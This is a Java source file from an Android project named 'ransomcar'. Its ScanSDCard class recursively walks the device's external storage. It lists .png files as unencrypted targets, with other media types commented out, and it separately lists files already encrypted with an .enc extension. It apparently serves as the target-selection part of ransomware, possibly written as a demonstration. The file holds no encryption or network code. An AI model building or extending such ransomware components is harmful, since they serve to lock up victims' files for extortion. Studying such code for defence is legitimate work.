package com.example.ransomcar;

import java.io.File;
import java.util.ArrayList;

import android.annotation.SuppressLint;
import android.os.Environment;
import android.util.Log;

public class ScanSDCard {

static File parentDir = Environment.getExternalStorageDirectory();
static String string = "";

public static ArrayList<String> getListOfFiles() {
	return getListOfMedia(parentDir, string);
}

static ArrayList<String> getListOfEncryptedFiles() {
	return getListOfEncryptedMedia(parentDir, string);
}

@SuppressLint("DefaultLocale")
static ArrayList<String> getListOfMedia(File parentDir1, String string1) {
    	ArrayList<String> unencryptedFiles = new ArrayList<String>();
    	Log.d("Start scanning files", "Scanning");
	    String[] fileNames = parentDir1.list();
	    //Log.d("First file", "This file " + fileNames[0]);
	    for (String fileName : fileNames) {
	    	Log.d("Getting media files", "Current file is " + fileName);
	        if (fileName.toLowerCase().endsWith(".png")
	        		//|| fileName.endsWith(".jpg")
	        		//|| fileName.endsWith(".mp3")
	        		//|| fileName.endsWith(".mp4")
	        		//|| fileName.endsWith(".png") 
	        		//|| fileName.endsWith(".pdf")
	        		){	        	
	        	unencryptedFiles.add(parentDir1 +"/"+ fileName);
	        } 
	        else if (fileName.equals(".android_secure")) {
            	continue;
            	}
	        else {
	            File file1 = new File(parentDir1.getPath() + "/" + fileName);
	            if(file1.isDirectory()) {
	            	unencryptedFiles.addAll(getListOfMedia(file1, string1 + fileName + "/"));	
	            }
	        }
	    }        
	    return unencryptedFiles;
	}

static ArrayList<String> getListOfEncryptedMedia(File parentDir2, String string2) {
    	ArrayList<String> encryptedFiles = new ArrayList<String>();
    	String[] fileNamesEncrypted = parentDir2.list();
    	for (String encFileName : fileNamesEncrypted) {
    		Log.d("Getting encrypted files", "Current file is " + encFileName);
    		if (encFileName.endsWith(".enc") ){
    			encryptedFiles.add(parentDir2 +"/"+ encFileName); 
    			}
    		else if (encFileName.equals(".android_secure")) {
            	continue;
            	}
    		else {
            File file2 = new File(parentDir2.getPath() + "/" + encFileName);
            	if (file2.isDirectory()) {
            		encryptedFiles.addAll(getListOfEncryptedMedia(file2, string2 + encFileName + "/"));
            	}
            }
    	}
    	return encryptedFiles;
    }
}
